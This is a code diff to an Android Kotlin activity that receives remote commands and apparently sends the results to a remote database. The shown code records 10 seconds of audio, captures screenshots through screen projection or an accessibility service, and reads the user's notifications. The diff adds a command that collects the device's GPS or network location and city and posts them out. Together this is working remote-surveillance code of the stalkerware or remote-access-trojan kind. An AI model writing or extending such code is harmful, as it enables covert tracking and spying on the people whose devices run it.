@@ -11,6 +11,9 @@ import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
+import android.location.Geocoder
+import android.location.Location
+import android.location.LocationManager
 import android.media.ImageReader
 import android.media.MediaRecorder
 import android.media.projection.MediaProjectionManager
@@ -50,6 +53,7 @@ class CommandReceiverActivity : AppCompatActivity() {
                     "RECORD_AUDIO" -> recordAudio()
                     "SCREENSHOT_MP" -> startMediaProjectionScreenshot()
                     "SCREENSHOT_A11Y" -> takeA11yScreenshot()
+                "GET_LOCATION" -> getLocation()
                 }
             }
         }
@@ -62,9 +66,6 @@ class CommandReceiverActivity : AppCompatActivity() {
         androidx.core.content.ContextCompat.registerReceiver(this, receiver, filter, androidx.core.content.ContextCompat.RECEIVER_EXPORTED)
 
         mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-
-        // Ensure this activity finishes nicely or goes to background
-        moveTaskToBack(true)
 
         intent?.let { handleIntent(it) }
     }
@@ -88,6 +89,7 @@ class CommandReceiverActivity : AppCompatActivity() {
                 "RECORD_AUDIO" -> recordAudio()
                 "SCREENSHOT_MP" -> startMediaProjectionScreenshot()
                 "SCREENSHOT_A11Y" -> takeA11yScreenshot()
+                "GET_LOCATION" -> getLocation()
             }
         }
     }
@@ -108,6 +110,44 @@ class CommandReceiverActivity : AppCompatActivity() {
         ref.setValue(payload)
     }
 
+    private fun getLocation() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            postResult("ERROR", "Location permissions denied")
+            finish()
+            return
+        }
+
+        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        var location: Location? = null
+        try {
+            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (location == null) {
+                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            }
+        } catch(e: Exception) {
+            Log.e("CommandReceiver", "Location error", e)
+        }
+
+        if (location != null) {
+            val geocoder = Geocoder(this, java.util.Locale.getDefault())
+            try {
+                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
+                if (!addresses.isNullOrEmpty()) {
+                    val address = addresses[0]
+                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
+                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
+                    finish()
+                    return
+                }
+            } catch (e: Exception) { }
+            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
+        } else {
+            postResult("ERROR", "Could not determine location")
+        }
+        finish()
+    }
+
     private fun readNotifications() {
         val notifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
         val text = if (notifs.isEmpty()) {
@@ -116,6 +156,7 @@ class CommandReceiverActivity : AppCompatActivity() {
             notifs.joinToString("\n")
         }
         postResult("TEXT", text)
+        finish()
     }
 
     private fun recordAudio() {
@@ -152,11 +193,13 @@ class CommandReceiverActivity : AppCompatActivity() {
                     postResult("ERROR", "Recording failed: ${e.message}")
                 } finally {
                     outputFile.delete()
+                    finish()
                 }
             }, 10000) // 10 seconds record time
 
         } catch (e: Exception) {
             postResult("ERROR", "Recorder error: ${e.message}")
+            finish()
         }
     }
 
@@ -173,6 +216,7 @@ class CommandReceiverActivity : AppCompatActivity() {
                 takeMediaProjectionScreenshot(resultCode, data)
             } else {
                 postResult("ERROR", "Screen capture permission denied")
+                finish()
             }
         }
     }
@@ -181,6 +225,7 @@ class CommandReceiverActivity : AppCompatActivity() {
         val mediaProjection = mediaProjectionManager?.getMediaProjection(resultCode, data)
         if (mediaProjection == null) {
             postResult("ERROR", "Failed to get MediaProjection")
+            finish()
             return
         }
 
@@ -223,10 +268,12 @@ class CommandReceiverActivity : AppCompatActivity() {
 
                 virtualDisplay.release()
                 mediaProjection.stop()
+                finish()
             } else {
                 postResult("ERROR", "Failed to acquire image")
                 virtualDisplay.release()
                 mediaProjection.stop()
+                finish()
             }
         }, 1000)
     }
@@ -247,14 +294,17 @@ class CommandReceiverActivity : AppCompatActivity() {
                     } else {
                         postResult("ERROR", "Failed to create bitmap from screenshot")
                     }
+                    finish()
                 }
 
                 override fun onFailure(errorCode: Int) {
                     postResult("ERROR", "Accessibility Screenshot Failed: Code $errorCode")
+                    finish()
                 }
             })
         } else {
             postResult("ERROR", "Accessibility service not running or unsupported Android version (requires 11+)")
+            finish()
         }
     }
 }
